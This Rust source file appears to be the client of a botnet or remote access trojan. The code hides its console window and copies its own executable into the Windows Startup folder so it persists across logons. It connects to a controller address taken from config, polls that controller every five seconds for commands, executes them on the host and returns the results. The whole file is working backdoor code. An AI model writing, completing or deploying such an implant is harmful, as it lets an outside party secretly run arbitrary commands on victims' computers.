#![windows_subsystem = "windows"]

use bnet_core::{config, protocol, utils};
use std::net::TcpStream;

mod terminal;

fn main() {
    std::process::Command::new("cmd")
        .args([
            "/c",
            "copy",
            format!("{}", get_exec_name().unwrap()).as_str(),
            r"C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup",
        ])
        .output()
        .unwrap();
    match TcpStream::connect(config::IP) {
        Ok(stream) => {
            println!("Successfully connected");

            let established_connection = utils::send_request_check(
                &stream,
                &protocol::TRY_ESTABLISH_CONNECTION,
                &protocol::CONNECTION_ESTABLISHED,
            );

            if established_connection {
                loop {
                    std::thread::sleep(std::time::Duration::from_millis(5000));
                    let response = utils::send_request(&stream, &protocol::ACTION_REQUEST);
                    if response == protocol::ACTION_RESPONSE {
                        let args = response.get_msg().split(", ").collect::<Vec<&str>>();
                        let args_formated = args
                            .iter()
                            .map(|x| x.replace('\"', ""))
                            .collect::<Vec<String>>();
                        println!("{:?}", args_formated);
                        let ACTION_REQUEST = terminal::execute_command(args_formated);
                        &utils::send_request(&stream, &ACTION_REQUEST);
                    }
                }
            }
            utils::send_request_check(
                &stream,
                &protocol::CONNECTION_CLOSED,
                &protocol::CONNECTION_CLOSED,
            );
        }
        Err(e) => {
            println!("Failed to connect: {}", e);
        }
    }
}

fn get_exec_name() -> Option<String> {
    std::env::current_exe()
        .ok()
        .and_then(|pb| pb.file_name().map(|s| s.to_os_string()))
        .and_then(|s| s.into_string().ok())
}
